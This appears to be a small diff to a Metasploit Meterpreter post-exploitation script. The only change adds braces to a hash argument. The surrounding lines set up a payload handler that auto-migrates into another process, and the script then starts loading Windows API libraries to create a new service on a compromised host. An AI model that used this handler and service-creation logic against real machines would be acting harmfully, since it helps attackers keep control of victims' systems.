@@ -84,10 +84,10 @@ handler.datastore['LPORT']   = rport
 handler.datastore['InitialAutoRunScript'] = "migrate -f"
 handler.datastore['ExitOnSession'] = false
 #start a handler to be ready
-handler.exploit_simple(
+handler.exploit_simple({
   'Payload'  => handler.datastore['PAYLOAD'],
   'RunAsJob' => true
-)
+})
 
 #attempt to make new service
 client.railgun.kernel32.LoadLibraryA("advapi32.dll")
